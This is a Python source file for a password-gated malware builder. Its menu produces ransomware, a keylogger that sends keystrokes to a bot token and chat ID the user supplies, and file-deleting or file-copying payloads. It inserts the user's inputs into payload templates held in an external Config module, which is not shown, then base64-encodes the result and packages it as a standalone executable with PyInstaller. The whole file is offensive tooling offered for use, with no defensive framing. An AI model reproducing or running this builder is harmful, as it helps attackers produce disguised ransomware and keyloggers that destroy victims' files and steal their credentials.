# Import Libs :

import sys, platform, os, getpass, subprocess, shutil, base64

def Check_Libraries(x) :
    try:
        exec (f"import {x}")
    except:
        sys.exit (f"\033[91m\n [-] Error - Install {x}")

Libraries = ["Config", "colorama", "requests", "time"]
x = [Check_Libraries(i) for i in Libraries]

import Config, requests, time
from colorama import Fore,init
init()


# Check Internet :

try:
    connection = requests.get ("http://google.com/")
except:
    sys.exit ("\033[91m\n [-] Error - No Internet Connection")


# Clear :

System = platform.uname()[0]

Clear = "cls" if System == "Windows" else "clear"
os.system (Clear)


# Clean

BuildFolder = ["build", "dist"]
BuildFile = ["Source.spec", "Source.py"]

for i in BuildFolder :
    shutil.rmtree(i) if os.path.exists(i) else ...

for i in BuildFile :
    os.remove(i) if os.path.exists(i) else ...


# Function 1 :

def Ransomware() :
    print (Fore.WHITE, "\n Ransomware:", Fore.LIGHTCYAN_EX)

    try:
        Name = input (f"\n [File_Name & .Format|--> ")
    except:
        sys.exit ("\033[91m\n [-] Error - Wrong Input")

    from Config import Source_01
    Source_01 = Source_01.replace ('', f'{Name}')

    return Source_01


# Function 2 :

def Keylogger() :
    print (Fore.WHITE, "\n Keylogger: \n", Fore.LIGHTCYAN_EX)

    try:
        ChatID = input (f" [ChatID|--> ")
        Token = input (f" [Token|--> ")
    except:
        sys.exit ("\033[91m\n [-] Error - Wrong Input")

    from Config import Source_02
    Source_02 = Source_02.replace ('Token, ChatID = Token, ChatID', f'Token, ChatID = "{Token}", "{ChatID}"')

    return Source_02


# Function 3 :

def Copy() :
    print (Fore.WHITE, "\n Copy File: \n", Fore.LIGHTCYAN_EX)

    try:
        Name = input (f"\n [File_Name & .Format|--> ")
    except:
        sys.exit ("\033[91m\n [-] Error - Wrong Input")

    from Config import Source_03
    Source_03 = Source_03.replace ('', f'{Name}')

    return Source_03


# Function 4 :

def Delete() :
    print (Fore.WHITE, "\n Delete File: \n", Fore.LIGHTCYAN_EX)

    try:
        Name = input (f"\n [File_Name & .Format|--> ")
    except:
        sys.exit ("\033[91m\n [-] Error - Wrong Input")

    from Config import Source_04
    Source_04 = Source_04.replace ('', f'{Name}')

    return Source_04


# Login :

print (Fore.WHITE, """
 Welcome to
 Mini Builder Version 1
""", Fore.LIGHTCYAN_EX)

Password = getpass.getpass (" [Password|--> ")
time.sleep(0.5), os.system(Clear) if Password == Config.Password else sys.exit ("\033[91m\n [-] Error - Wrong Password")


# Menu :

print (Fore.WHITE, "\n [~] Choose one of the option:")
print (Fore.LIGHTYELLOW_EX, """
 [1] Ransomware    [2] Keylogger
 [3] Delete File   [4] Copy File
 [E] Exit
""", Fore.LIGHTCYAN_EX)

try:
    choose = input (f" [{Config.Username}|--> ")
except:
    sys.exit ("\033[91m\n [-] Error - Wrong Input")

os.system(Clear)

if choose == "1" :
    source = Ransomware()
elif choose == "2" :
    source = Keylogger()
elif choose == "3" :
    source = Copy()
elif choose == "4" :
    source = Delete()


# Build File

print (Fore.LIGHTGREEN_EX)

print (" Encoding...")
source = base64.b64encode (source.encode())

print (" Writing...")
with open("Source.py", "w") as file :
    file.write (source.decode())
    file.close()

print (" Building...")
Dir = os.getcwd()
subprocess.getoutput (f'pyinstaller --noconfirm --onefile --console  "{Dir}/Source.py"')

print (" Wait...")
try:

    for i in BuildFile :
        os.remove(i) if os.path.exists(i) else ...

    os.chdir (f"{Dir}/dist")
    shutil.move ("Source.exe", Dir)
    os.chdir (Dir)

    for i in BuildFolder :
        shutil.rmtree(i) if os.path.exists(i) else ...

except:
    sys.exit ("\033[91m\n [-] Error - Export")

print (" Finished")


input()
